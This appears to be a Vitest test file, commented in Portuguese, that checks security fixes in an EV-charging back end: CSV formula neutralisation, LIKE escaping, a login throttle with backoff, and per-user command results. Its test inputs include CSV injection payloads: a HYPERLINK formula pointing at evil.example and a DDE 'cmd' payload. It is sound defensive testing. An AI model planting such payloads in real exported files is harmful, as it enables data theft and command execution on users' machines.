import { describe, expect, it } from 'vitest'
import { csvEscape, csvMoney, csvEnergyKwh, csvPct, neutralizeFormula } from '../../src/api/lib/csvExport'
import { escapeLike } from '../../src/api/lib/sqlLike'
import { DEFAULT_LOGIN_THROTTLE, createLoginThrottle, lockDurationSeconds, type ThrottleStore } from '../../src/core/auth/loginThrottle'
import { decodeCommandResult, encodeCommandResult } from '../../src/ocpp/commandResultCache'

describe('csvEscape — CSV formula injection (Órion M2)', () => {
  it('REGRESSÃO: =HYPERLINK(...) (nome de motorista controlado pelo atacante) sai NEUTRALIZADO com apóstrofo', () => {
    // Antes saía intacto e a planilha executava a fórmula.
    const out = csvEscape('=HYPERLINK("http://evil.example/steal","clique")')
    expect(out.startsWith('"\'=HYPERLINK(')).toBe(true) // apóstrofo dentro das aspas (a célula tem `"`)
    expect(out).not.toMatch(/^"?=/)
  })

  it.each([
    ['=1+1', "'=1+1"],
    ['+cmd|" /C calc"!A0', null],
    ['-2+3', "'-2+3"],
    ['@SUM(1+1)', "'@SUM(1+1)"],
    ['\tTAB', null],
    ['\rCR', null],
  ])('neutraliza início perigoso: %j', (input, exato) => {
    const out = csvEscape(input)
    const semAspas = out.replace(/^"|"$/g, '')
    expect(semAspas.startsWith("'")).toBe(true)
    if (exato) expect(out).toBe(exato)
  })

  it('só o início importa: fórmula no MEIO do texto não é tocada', () => {
    expect(csvEscape('João =1+1')).toBe('João =1+1')
    expect(csvEscape('a-b@c')).toBe('a-b@c')
  })

  it('números negativos/positivos legítimos NÃO são prefixados (colunas de dinheiro/energia/pct)', () => {
    expect(csvEscape(-12)).toBe('-12')
    expect(csvEscape('-1234,56')).toBe('-1234,56')
    expect(csvEscape('+12.5')).toBe('+12.5')
    expect(csvMoney(-500)).toBe('-5,00')
    expect(csvEscape(csvMoney(-500))).toBe('-5,00')
    expect(csvEscape(csvEnergyKwh(-1500))).toBe('-1,500')
    expect(csvEscape(csvPct(-3.5))).toBe('-3,50')
  })

  it('texto normal, datas ISO, vazio e nulos seguem como antes', () => {
    expect(csvEscape('Maria')).toBe('Maria')
    expect(csvEscape('2026-09-19T12:00:00.000Z')).toBe('2026-09-19T12:00:00.000Z')
    expect(csvEscape(null)).toBe('')
    expect(csvEscape(undefined)).toBe('')
    expect(csvEscape(0)).toBe('0')
  })

  it('a regra de aspas/separador continua valendo depois do prefixo', () => {
    expect(csvEscape('a;b')).toBe('"a;b"')
    expect(csvEscape('diz "oi"')).toBe('"diz ""oi"""')
    expect(csvEscape('=A;B')).toBe('"\'=A;B"')
  })

  it('neutralizeFormula é idempotente no que já é seguro', () => {
    expect(neutralizeFormula('seguro')).toBe('seguro')
    expect(neutralizeFormula('')).toBe('')
  })
})

describe('escapeLike (Órion M9)', () => {
  it('escapa %, _ e a barra invertida', () => {
    expect(escapeLike('%%%')).toBe('\\%\\%\\%')
    expect(escapeLike('a_b')).toBe('a\\_b')
    expect(escapeLike('c:\\dir')).toBe('c:\\\\dir')
  })

  it('termo sem metacaractere passa intacto', () => {
    expect(escapeLike('maria silva')).toBe('maria silva')
    expect(escapeLike('')).toBe('')
  })

  it('uma busca "%%%" (3 chars, passa no mínimo do OPERATOR) vira TEXTO LITERAL, não curinga', () => {
    const padrao = `%${escapeLike('%%%')}%`
    expect(padrao).toBe('%\\%\\%\\%%')
  })
})

/** Store em memória com TTL simulado por um relógio manual. */
function memoryStore(clock: { now: number }): ThrottleStore & { has(key: string): boolean } {
  const data = new Map<string, { value: number; expiresAt: number }>()
  const live = (key: string) => {
    const e = data.get(key)
    if (!e) return undefined
    if (e.expiresAt <= clock.now) {
      data.delete(key)
      return undefined
    }
    return e
  }
  return {
    async reserve(keys, maxFailures, windowSeconds) {
      // Mesma semântica do script Lua (lib/redisCounter.ts): trancada -> locked; cheia -> full; senão INCR. Síncrono = atômico.
      const lock = live(keys.lock)
      if (lock) return { status: 'locked', retryAfterSeconds: Math.ceil((lock.expiresAt - clock.now) / 1000) }
      const atual = live(keys.failures)?.value ?? 0
      if (atual >= maxFailures) return { status: 'full' }
      const e = live(keys.failures)
      if (e) e.value++
      else data.set(keys.failures, { value: 1, expiresAt: clock.now + windowSeconds * 1000 })
      return { status: 'ok', count: atual + 1 }
    },
    async release(key) {
      const e = live(key)
      if (!e) return
      if (e.value > 1) e.value--
      else data.delete(key)
    },
    async incrWithTtl(key, ttl) {
      const e = live(key)
      if (e) {
        e.value++
        return e.value
      }
      data.set(key, { value: 1, expiresAt: clock.now + ttl * 1000 })
      return 1
    },
    async setWithTtl(key, value, ttl) {
      data.set(key, { value, expiresAt: clock.now + ttl * 1000 })
    },
    async del(keys) {
      for (const k of keys) data.delete(k)
    },
    has: (key) => live(key) !== undefined,
  }
}

/** Uma tentativa de login que FALHA, como a rota faz: reserva a vaga e confirma a falha. `null` = recusada pelo portão. */
async function falhar(throttle: ReturnType<typeof createLoginThrottle>, email: string) {
  const gate = await throttle.reserveAttempt(email)
  if (!gate.allowed) return null
  return throttle.registerFailure(email, gate.failures)
}

/** "Espia" o portão sem gastar vaga: reserva e devolve na hora. */
async function portaoPermite(throttle: ReturnType<typeof createLoginThrottle>, email: string): Promise<boolean> {
  const gate = await throttle.reserveAttempt(email)
  if (gate.allowed) await throttle.release(email)
  return gate.allowed
}

describe('loginThrottle — por conta, com backoff (Órion M7)', () => {
  const EMAIL = 'admin@innoelektron.example.com'

  function setup() {
    const clock = { now: 1_000_000 }
    const throttle = createLoginThrottle(memoryStore(clock))
    return { clock, throttle }
  }

  it('abaixo do limite: permitido', async () => {
    const { throttle } = setup()
    for (let i = 0; i < 4; i++) await falhar(throttle, EMAIL)
    expect(await portaoPermite(throttle, EMAIL)).toBe(true)
  })

  it('a 5ª falha TRANCA a conta (60s) e sinaliza o instante (para alertar)', async () => {
    const { throttle } = setup()
    for (let i = 0; i < 4; i++) await falhar(throttle, EMAIL)
    const quinta = await falhar(throttle, EMAIL)

    expect(quinta).toMatchObject({ lockedNow: true, lockSeconds: 60 })
    expect(await throttle.reserveAttempt(EMAIL)).toEqual({ allowed: false, retryAfterSeconds: 60 })
  })

  it('durante o trancamento a conta segue recusada (mesmo que a próxima tentativa fosse a senha certa)', async () => {
    const { throttle, clock } = setup()
    for (let i = 0; i < 5; i++) await falhar(throttle, EMAIL)
    clock.now += 30_000
    const gate = await throttle.reserveAttempt(EMAIL)
    expect(gate.allowed).toBe(false)
    if (!gate.allowed) expect(gate.retryAfterSeconds).toBe(30)
  })

  it('depois do tempo, libera; a REINCIDÊNCIA tranca por mais tempo (backoff: 60s, 120s, 240s...)', async () => {
    const { throttle, clock } = setup()
    const locks: number[] = []
    for (let ciclo = 0; ciclo < 3; ciclo++) {
      for (let i = 0; i < 4; i++) await falhar(throttle, EMAIL)
      const r = (await falhar(throttle, EMAIL))!
      locks.push(r.lockSeconds)
      clock.now += (r.lockSeconds + 1) * 1000 // espera o trancamento passar
      expect(await portaoPermite(throttle, EMAIL)).toBe(true)
    }
    expect(locks).toEqual([60, 120, 240])
  })

  it('o backoff tem teto (15 min)', () => {
    expect(lockDurationSeconds(1, DEFAULT_LOGIN_THROTTLE)).toBe(60)
    expect(lockDurationSeconds(4, DEFAULT_LOGIN_THROTTLE)).toBe(480)
    expect(lockDurationSeconds(5, DEFAULT_LOGIN_THROTTLE)).toBe(900)
    expect(lockDurationSeconds(50, DEFAULT_LOGIN_THROTTLE)).toBe(900)
  })

  it('a janela de falhas expira: 4 falhas hoje e 1 depois de 15 min NÃO somam 5', async () => {
    const { throttle, clock } = setup()
    for (let i = 0; i < 4; i++) await falhar(throttle, EMAIL)
    clock.now += (DEFAULT_LOGIN_THROTTLE.windowSeconds + 1) * 1000
    const r = await falhar(throttle, EMAIL)
    expect(r).toMatchObject({ lockedNow: false, failures: 1 })
  })

  it('sucesso zera as falhas recentes (mas NÃO as reincidências — acertar uma vez não limpa o histórico)', async () => {
    const { throttle, clock } = setup()
    // 1º trancamento
    for (let i = 0; i < 5; i++) await falhar(throttle, EMAIL)
    clock.now += 61_000
    // 4 falhas + sucesso: o contador zera
    for (let i = 0; i < 4; i++) await falhar(throttle, EMAIL)
    await throttle.registerSuccess(EMAIL)
    for (let i = 0; i < 4; i++) await falhar(throttle, EMAIL)
    expect(await portaoPermite(throttle, EMAIL)).toBe(true) // 4 (não 8): o sucesso zerou
    // ...mas a próxima reincidência já é a 2ª (120s), não a 1ª
    expect((await falhar(throttle, EMAIL))!.lockSeconds).toBe(120)
  })

  it('e-mail é normalizado (caixa/espaços) e contas diferentes têm baldes independentes', async () => {
    const { throttle } = setup()
    for (let i = 0; i < 5; i++) await falhar(throttle, `  ${EMAIL.toUpperCase()} `)
    expect((await throttle.reserveAttempt(EMAIL)).allowed).toBe(false) // mesma conta
    expect((await throttle.reserveAttempt('outro@example.com')).allowed).toBe(true)
  })

  it('nenhuma chave do Redis contém o e-mail em claro (hash de tamanho fixo)', async () => {
    const clock = { now: 0 }
    const keys: string[] = []
    const store = memoryStore(clock)
    const spy: ThrottleStore = {
      ...store,
      reserve: async (k, max, w) => {
        keys.push(k.lock, k.failures)
        return store.reserve(k, max, w)
      },
      incrWithTtl: async (k, t) => {
        keys.push(k)
        return store.incrWithTtl(k, t)
      },
      setWithTtl: async (k, v, t) => {
        keys.push(k)
        return store.setWithTtl(k, v, t)
      },
    }
    const throttle = createLoginThrottle(spy)
    for (let i = 0; i < 5; i++) await falhar(throttle, EMAIL)
    expect(keys.length).toBeGreaterThan(0)
    for (const k of keys) {
      expect(k).not.toContain('admin')
      expect(k).not.toContain('@')
    }
  })
})

describe('loginThrottle — reserva ANTES de avaliar (rajada paralela)', () => {
  const EMAIL = 'rajada@innoelektron.example.com'
  const setup = () => createLoginThrottle(memoryStore({ now: 1_000_000 }))

  /** Uma tentativa como a rota: reserva -> "bcrypt" assíncrono -> falha. Devolve se foi AVALIADA (passou do portão). */
  async function tentativaComBcryptLento(throttle: ReturnType<typeof createLoginThrottle>, email: string): Promise<boolean> {
    const gate = await throttle.reserveAttempt(email)
    if (!gate.allowed) return false
    await new Promise((r) => setTimeout(r, 20)) // o bcrypt (~250ms de verdade): tempo de sobra para o furo antigo aparecer
    await throttle.registerFailure(email, gate.failures)
    return true
  }

  it('REGRESSÃO (Íris): 40 senhas erradas em paralelo, limite 5 -> EXATAMENTE 5 avaliadas e 35 barradas (antes: 40 avaliadas, 0 barradas)', async () => {
    const throttle = setup()
    const avaliadas = (await Promise.all(Array.from({ length: 40 }, () => tentativaComBcryptLento(throttle, EMAIL)))).filter(Boolean).length
    expect(avaliadas).toBe(5)
  })

  it('a recusa por "vagas cheias" (última ainda no bcrypt) não escreve nada e sugere o trancamento base como Retry-After', async () => {
    const throttle = setup()
    for (let i = 0; i < 5; i++) expect((await throttle.reserveAttempt(EMAIL)).allowed).toBe(true) // 5 em andamento, nenhuma terminou
    expect(await throttle.reserveAttempt(EMAIL)).toEqual({ allowed: false, retryAfterSeconds: DEFAULT_LOGIN_THROTTLE.baseLockSeconds })
  })

  it('erro NOSSO no meio (release) devolve a vaga: 5 reservas com 5 erros de banco não trancam ninguém', async () => {
    const throttle = setup()
    for (let i = 0; i < 20; i++) {
      const gate = await throttle.reserveAttempt(EMAIL)
      expect(gate.allowed).toBe(true)
      await throttle.release(EMAIL)
    }
  })

  it('sucesso no meio da rajada zera as falhas (regra "sucesso zera as falhas recentes" preservada)', async () => {
    const throttle = setup()
    for (let i = 0; i < 4; i++) await falhar(throttle, EMAIL)
    const ultima = await throttle.reserveAttempt(EMAIL) // a 5ª vaga: a senha está certa
    expect(ultima.allowed).toBe(true)
    await throttle.registerSuccess(EMAIL)
    expect(await portaoPermite(throttle, EMAIL)).toBe(true)
    expect(await falhar(throttle, EMAIL)).toMatchObject({ lockedNow: false, failures: 1 })
  })

  it('fail-open (sem reserva, Redis fora na entrada): a falha é contada à moda antiga e ainda tranca na 5ª', async () => {
    const throttle = setup()
    const resultados = []
    for (let i = 0; i < 5; i++) resultados.push(await throttle.registerFailure(EMAIL)) // sem `failures` reservado
    expect(resultados.map((r) => r.lockedNow)).toEqual([false, false, false, false, true])
  })
})

describe('resultado de comando vinculado ao usuário (Órion)', () => {
  const ESCOPO = (userId: string) => ({ userId, chargePointId: 'cp-1', operatorId: 'op-1' }) // L1.5: o registro também carrega o escopo
  it('o dono lê o próprio resultado', () => {
    expect(decodeCommandResult(encodeCommandResult(ESCOPO('user-a'), 'ACCEPTED'), 'user-a')).toBe('ACCEPTED')
    expect(decodeCommandResult(encodeCommandResult(ESCOPO('user-a'), 'TIMEOUT'), 'user-a')).toBe('TIMEOUT')
  })

  it('OUTRO usuário com o mesmo correlationId recebe null (=PENDING, indistinguível de "não existe")', () => {
    expect(decodeCommandResult(encodeCommandResult(ESCOPO('user-a'), 'ACCEPTED'), 'user-b')).toBeNull()
  })

  it('valor antigo (sem dono), malformado ou inexistente -> null', () => {
    expect(decodeCommandResult('ACCEPTED', 'user-a')).toBeNull() // sem "userId|": malformado
    expect(decodeCommandResult('user-a|LIXO', 'user-a')).toBeNull()
    expect(decodeCommandResult(null, 'user-a')).toBeNull()
    expect(decodeCommandResult('', 'user-a')).toBeNull()
  })

  it('prefixo de userId não engana (user-a não lê o resultado de user-ab)', () => {
    expect(decodeCommandResult(encodeCommandResult(ESCOPO('user-ab'), 'ACCEPTED'), 'user-a')).toBeNull()
  })
})
